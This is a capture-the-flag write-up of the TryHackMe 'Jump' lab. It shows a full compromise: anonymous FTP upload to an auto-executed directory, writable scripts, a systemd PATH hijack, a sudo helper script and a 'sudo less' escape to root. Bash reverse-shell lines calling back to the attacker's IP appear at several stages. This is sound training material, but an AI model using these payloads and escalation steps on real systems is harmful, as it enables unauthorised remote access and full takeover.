---
title: Jump
date: 2026-10-14
platform: TryHackMe
difficulty: Easy
tags:
  - Linux
summary: Initial access via FTP pipeline injection led to root compromise through chained script write-privileges, systemd PATH hijacking, and sudo less.
draft: false
---
# Room link: https://tryhackme.com/room/jump

![](../Attachments/Pasted%20image%2020261014024455.png)

# Nmap scan

```bash
$ sudo nmap -sCVT -p- --min-rate 1000 -T4 -oN nmap.txt jump.thm     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 02:47 +0800
Nmap scan report for jump.thm (10.145.145.221)
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
|_drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.135.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e5:0c:ad:be:4a:04:1f:ba:e5:4c:60:c0:e8:1a:9a:98 (ECDSA)
|_  256 69:f4:76:e9:52:e0:c1:1c:2d:8a:0b:07:4b:b5:6c:bd (ED25519)
13764/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# FTP

```bash
$ ftp jump.thm 21             
Connected to jump.thm.
220 (vsFTPd 3.0.5)
Name (jump.thm:zephyr): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||54928|)
150 Here comes the directory listing.
drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming
drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
226 Directory send OK.
```

Anonymous login is permitted which allowed me to scrub the file server.

- incoming is empty
- pub have some files.

## PUB

```bash
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||18156|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             139 Feb 02  2026 README.txt
drwxr-xr-x    2 115      123          4096 Feb 01  2026 archive
drwxrwxrwx    2 115      123          4096 Feb 01  2026 uploads
226 Directory send OK.
ftp> get README.txt
local: README.txt remote: README.txt
```

- archive is empty
- uploads is empty

### README.txt

```bash
$ cat README.txt 
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

This means that every file inside the `incoming` directory on the file server is being processed. Although I'm not sure what it means but it could result to `Remote Code Exection`.

I made a `Proof of concept` to test if I can abuse it to gain `Remote Code Execution`.

### PING.SH

```bash
$ cat ping.sh    
#!/bin/bash

target="192.168.135.167"
count=5

ping -c $count $target
```

This script will ping my attack host 5 times. I will use `tcpdump` to see if I will receive those pings.

Next step is to put it in the `incoming` directory of the File server.

```bash
$ ftp jump.thm 21
Connected to jump.thm.
220 (vsFTPd 3.0.5)
Name (jump.thm:zephyr): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd incoming
250 Directory successfully changed.
ftp> put ping.sh
local: ping.sh remote: ping.sh
229 Entering Extended Passive Mode (|||13764|)
150 Ok to send data.
100% |**********************************************************|    70      240.70 KiB/s    00:00 ETA
226 Transfer complete.
70 bytes sent in 00:00 (0.13 KiB/s)
```

Run `tcpdump` on the vpn interface.

```bash
$ sudo tcpdump -i tun0 icmp -n
[sudo] password for zephyr: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:59:02.159453 IP 10.145.145.221 > 192.168.135.167: ICMP echo request, id 1931, seq 1, length 64
02:59:02.159484 IP 192.168.135.167 > 10.145.145.221: ICMP echo reply, id 1931, seq 1, length 64
02:59:03.183581 IP 10.145.145.221 > 192.168.135.167: ICMP echo request, id 1931, seq 2, length 64
02:59:03.183613 IP 192.168.135.167 > 10.145.145.221: ICMP echo reply, id 1931, seq 2, length 64
02:59:04.207147 IP 10.145.145.221 > 192.168.135.167: ICMP echo request, id 1931, seq 3, length 64
```

This confirms that I can achieve `Remote Code Execution`.

Create a reverse shell file.

```bash
$ cat revshell.sh 
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.135.167/9001 0>&1
```

Setup a listener on my attack host. 

```bash
$ nc -lvnp 9001                      
listening on [any] 9001 ...
```

Do the exact same thing, upload the reverse shell on the `incoming` directory on the File server and wait for it to trigger my reverse shell.

# Recon_user

```bash
$ nc -lvnp 9001                      
listening on [any] 9001 ...
connect to [192.168.135.167] from (UNKNOWN) [10.145.145.221] 50944
bash: cannot set terminal process group (2222): Inappropriate ioctl for device
bash: no job control in this shell
recon_user@tryhackme-2404:~$ 
```

## Flag

```bash
recon_user@tryhackme-2404:~$ ls -la
total 36
drwxr-x--- 3 recon_user recon_user 4096 Jun  9 08:09 .
drwxr-xr-x 7 root       root       4096 Apr 29 10:46 ..
-rw-r--r-- 1 recon_user recon_user  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 recon_user recon_user 3877 Apr 26 19:22 .bashrc
drwxrwxr-x 3 recon_user recon_user 4096 Jun  9 08:09 .local
-rw-r--r-- 1 recon_user recon_user  807 Feb 25  2020 .profile
-rw-rw-r-- 1 recon_user recon_user   66 Jun  9 08:09 .selected_editor
-rw-r--r-- 1 recon_user recon_user   42 Apr 26 19:39 flag.txt
-rw-rw-r-- 1 recon_user recon_user   55 Feb  2  2026 shell.sh
recon_user@tryhackme-2404:~$ cat flag.txt
THM{REDACTED}
```

This is the first flag.

```bash
recon_user@tryhackme-2404:/etc$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

Here it shows that `recon_user` is also part of groups `dev_user` and `devops`.

## Privilege escalation

In the directory `/opt/dev` there is a file called `backup.sh`.

```bash
recon_user@tryhackme-2404:/opt/dev$ ls -la
total 16
drwxrwxr-x 3 dev_user dev_user 4096 Jun  9 09:03 .
drwxr-xr-x 5 root     root     4096 Feb  2  2026 ..
-rwxrwxr-x 1 dev_user dev_user   60 Jun  9 09:03 backup.sh
drwxr-xr-x 2 dev_user dev_user 4096 Apr 26 18:19 bin
```

This is owned by `dev_user` and the group `dev_user` have `RW` permission. The file basically backups and compresses `recon_user's` home directory. Since my user have write access on it, I can simple spawn a another `reverse shell`. 

```bash
recon_user@tryhackme-2404:/opt/dev$ cat backup.sh 
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.135.167/9002 0>&1
```

Backups usually run on intervals to automate the process. After changing the `backup.sh`, setup a listener on `port 9002` and wait. 

# Dev_user

```bash
$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [192.168.135.167] from (UNKNOWN) [10.145.145.150] 55314
bash: cannot set terminal process group (1457): Inappropriate ioctl for device
bash: no job control in this shell
dev_user@tryhackme-2404:~$ id
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)
```

## Flag

```bash
dev_user@tryhackme-2404:~$ cat flag.txt 
THM{REDACTED}
```

## Privilege escalation

A writable service PATH was found using `linpeas.sh`. The name of the service is `healthcheck.service`.

```bash
â•”â•â•â•â•â•â•â•â•â•â•â•£ Systemd Information (T1543.002)
â•š https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#systemd-path---relative-paths                        
â•â•£ Systemd release (verify package fixes)? .......... 255                                              
â•â•£ Services running as root? ..... 
â•â•£ Running services with dangerous capabilities? ... 
â•â•£ Services with writable paths? . healthcheck.service: Writable service PATH entry '/opt/dev/bin'
```

```bash
dev_user@tryhackme-2404:/tmp$ cat /etc/systemd/system/healthcheck.service
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

So this service is running `healthcheck`. If you take a look at the `PATH`, it shows `/opt/dev/bin`, that path is owned by `dev_user`.  We can take advantage of that but we can't run it as `dev_user`.

I used tool called `pspy64` which monitors running processes in the server. 

```bash
2026/10/15 15:42:16 CMD: UID=1003  PID=98874  | /bin/bash /usr/local/bin/healthcheck 
2026/10/15 15:42:16 CMD: UID=1003  PID=98873  | ps aux 
2026/10/15 15:42:16 CMD: UID=1003  PID=98876  | sleep 5 
2026/10/15 15:42:21 CMD: UID=1003  PID=98878  | /bin/bash /usr/local/bin/healthcheck 
2026/10/15 15:42:21 CMD: UID=1003  PID=98877  | ps aux 
2026/10/15 15:42:21 CMD: UID=1003  PID=98879  | /bin/bash /usr/local/bin/healthcheck 
```

Turns out, it is a `cronjob` that is being check every 5 seconds.

### healthcheck

```bash
dev_user@tryhackme-2404:/opt/dev/bin$ cat /usr/local/bin//healthcheck 
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

This service is a script that uses `echo`, `ps`, `grep`, `sleep`. So what I'm going to do is create a binary for each and test which one works. I created a `Proof-of-concept` script first by pinging my `attack machine` and using `tcpdump` to see which `binary` works on the `Path Hijacking`.

```bash
#!/bin/bash
ping -c 5 192.168.135.167
```

On my attack machine, setup tcpdump. 

```bash
$ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Out of all the binaries, I got a response from `ps`.

```bash
$ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:44:31.019916 IP 10.146.154.153 > 192.168.135.167: ICMP echo request, id 2859, seq 1, length 64
00:44:31.019949 IP 192.168.135.167 > 10.146.154.153: ICMP echo reply, id 2859, seq 1, length 64
00:44:32.042668 IP 10.146.154.153 > 192.168.135.167: ICMP echo request, id 2859, seq 2, length 64
00:44:32.042702 IP 192.168.135.167 > 10.146.154.153: ICMP echo reply, id 2859, seq 2, length 64
```

Change `ps` payload to a reverse shell and setup another listener.

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.135.167/9004 0>&1
```

# Monitor_user

```bash
$ nc -lvnp 9004
listening on [any] 9004 ...
connect to [192.168.135.167] from (UNKNOWN) [10.146.154.153] 43188
bash: cannot set terminal process group (609): Inappropriate ioctl for device
bash: no job control in this shell
monitor_user@tryhackme-2404:/$
```

## Flag

```bash
monitor_user@tryhackme-2404:~$ cat flag.txt 
THM{REDACTED}
```

## Privilege Escalation

```bash
monitor_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`monitor_user` have sudo rights over `/usr/local/bin/deploy.sh` which is owned by `ops_user`.

```bash
monitor_user@tryhackme-2404:~$ cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The script runs `deploy_helper.sh` which is owned by `monitor_user`.

```bash
monitor_user@tryhackme-2404:/opt/app$ ls -la
total 16
drwxr-xr-x 3 ops_user     ops_user     4096 Feb  2  2026 .
drwxr-xr-x 5 root         root         4096 Feb  2  2026 ..
drwxrwxr-x 2 monitor_user monitor_user 4096 Oct 15 16:59 data
-rwxr-xr-x 1 monitor_user monitor_user   90 Feb  2  2026 deploy_helper.sh
```

Put a `reverse shell` on `deploy_help.sh` and setup a listener for it.

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.135.167/9005 0>&1
```

Run the sudo command for the file.

```bash
monitor_user@tryhackme-2404:/opt/app$ sudo -u ops_user /usr/local/bin/deploy.sh
```

# Ops_user

```bash
$ nc -lvnp 9005
listening on [any] 9005 ...
connect to [192.168.135.167] from (UNKNOWN) [10.146.154.153] 47012
ops_user@tryhackme-2404:/opt/app$ 
```

## Flag

```bash
ops_user@tryhackme-2404:~$ cat flag.txt
THM{REDACTED}
```

## Privilege escalation

`ops_user` have sudo rights for the binary `less` as root.

```bash
ops_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

Looking at `GTFObins`, it shows how to use the binary for privilege escalation.

![](../Attachments/Pasted%20image%2020261016012322.png)

# Root

Execute the command.

```bash
ops_user@tryhackme-2404:~$ sudo -u root /usr/bin/less /etc/hosts

# Type 
!/bin/sh

# whoami
root
cd /root
```

## Flag

```bash
# ls
flag.txt  snap
# cat flag.txt
THM{REDACTED}
```

